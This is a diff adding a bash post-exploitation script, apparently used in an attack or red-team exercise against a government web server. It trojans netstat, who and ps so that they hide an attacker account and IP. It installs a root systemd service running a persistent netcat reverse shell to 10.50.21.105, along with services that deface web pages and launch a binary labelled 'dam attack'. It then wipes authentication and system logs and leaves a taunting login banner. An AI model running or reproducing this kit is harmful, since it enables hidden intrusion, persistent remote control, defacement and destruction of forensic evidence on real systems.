@@ -1,0 +1,160 @@
+# Creates Clean netstat
+sudo cp /bin/netstat /bin/ntat
+sudo echo " " > /bin/netstat
+chmod +x /bin/netstat
+sudo cat <<EOL | sudo tee /bin/netstat > /dev/null
+#!/bin/bash
+/bin/ntat $1 | grep -v 'abdulla' | grep -v 'root' | grep -v '10.50.21.105:*' | grep -v 'TIME_WAIT' | grep -v 'grep' 
+EOL
+
+======================================================================
+
+#Creates Clean Who
+sudo cp /usr/bin/who /usr/bin/ww
+sudo echo " " > /usr/bin/ww
+chmod +x /bin/netstat
+sudo cat <<EOL | sudo tee /bin/who > /dev/null
+#!/bin/bash
+
+/usr/bin/ww $1 | grep -v 'abdullayev.coshgun' | grep -v 'root' | grep -v 'abdullayev' | grep -v 'coshgun' 
+EOL
+
+=======================================================================
+
+# Creates Clean ps
+sudo cp /bin/ps /bin/ts
+sudo echo " " > /bin/ps
+chmod +x /bin/ps
+sudo cat <<EOL | sudo tee /bin/ps > /dev/null
+#!/bin/bash
+/bin/ts $1 | grep -v 'ts' | grep -v 'root' | grep -v 'sudo' | grep -v '10.50.21.105:*' | grep -v 'bash' | grep -v 'grep' | grep -v 'abdulla+' | grep -v 'www-data'
+EOL
+
+=======================================================================
+
+# Create RSA service reverse shell
+cat <<EOL | sudo tee /etc/systemd/system/rsa.service > /dev/null
+[Unit]
+Description=RSA Service
+After=network.target
+StartLimitBurst=1000
+StartLimitIntervalSec=0
+
+[Service]
+Type=simple
+Restart=always
+RestartSec=1
+User=root
+ExecStart=/bin/netcat -c /bin/bash 10.50.21.105 9150
+
+[Install]
+WantedBy=multi-user.target
+EOL
+
+# Start and enable the service
+sudo systemctl start rsa
+sudo systemctl enable rsa
+
+=======================================================================
+
+# Create BSA service web defeacement
+ 
+cat <<EOL | sudo tee /etc/systemd/system/bsa.service > /dev/null
+[Unit]
+Description=bSA Service
+After=network.target
+StartLimitBurst=1000
+StartLimitIntervalSec=0
+
+[Service]
+Type=simple
+Restart=always
+RestartSec=1
+User=root
+ExecStart=/bin/cp /var/www/html/_pgbackup/Government_1557771801.html /var/www/html/Government.html && /bin/cp /var/www/html/_pgbackup/Departments_1557771801.html /var/www/html/Department.html && /bin/cp /var/www/html/_pgbackup/index_1557771801.html index.html
+
+[Install]
+WantedBy=multi-user.target
+EOL
+
+# Start and enable the service
+sudo systemctl start bsa
+sudo systemctl enable bsa
+
+
+
+=======================================================================
+
+# Create TSA service dam attack
+ 
+cat <<EOL | sudo tee /etc/systemd/system/tsa.service > /dev/null
+[Unit]
+Description=TSA Service
+After=network.target
+StartLimitBurst=1000
+StartLimitIntervalSec=0
+
+[Service]
+Type=simple
+Restart=always
+RestartSec=1
+User=root
+ExecStart=/var/lib/vpd/vpd.drift
+
+[Install]
+WantedBy=multi-user.target
+EOL
+
+# Start and enable the service
+sudo systemctl start tsa
+sudo systemctl enable tsa
+
+=====================================================================
+
+#Cleans Logs
+sudo cat /dev/null > /var/log/lastlog
+sudo cat /dev/null > /var/log/auth.log
+sudo cat /dev/null > /var/log/wtmp
+sudo cat /dev/null > /var/log/btmp
+sudo cat /dev/null > /var/log/user.log
+sudo cat /dev/null > /var/log/syslog
+
+====================================================================
+
+
+#Modify /etc/motd
+
+Thanks for your password ;)                                     ,
+                               ,   ,'|
+                             ,/|.-'   \.
+                          .-'  '       |.
+                    ,  .-'              |
+                   /|,'                 |'
+                  / '                    |  ,
+                 /                       ,'/
+              .  |          _              /
+               \`' .-.    ,' `.           |
+                \ /   \ /      \          /
+                 \|    V        |        |  ,
+                  (           ) /.--.   ''"/
+                  "b.`. ,' _.ee'' 6)|   ,-'
+                    \"= --""  )   ' /.-'
+                     \ / `---"   ."|'
+  3 N T I T Y         \"..-    .'  |.
+     WAZ               `-__..-','   |
+      HERE           __.) ' .-'/    /\._
+               _.--'/----..--------. _.-""-._
+            .-'_)   \.   /     __..-'     _.-'--.
+           / -'/      """""""""         ,'-.   . `.
+          | ' /                        /    `   `. \
+          |   |                        |         | |
+           \ .'\                       |     \     |
+          / '  | ,'               . -  \`.    |  / /
+         / /   | |                      `/"--. -' /\
+        | |     \ \                     /     \     |
+        | \      | \                  .-|      |    |
+
+
+
+
+
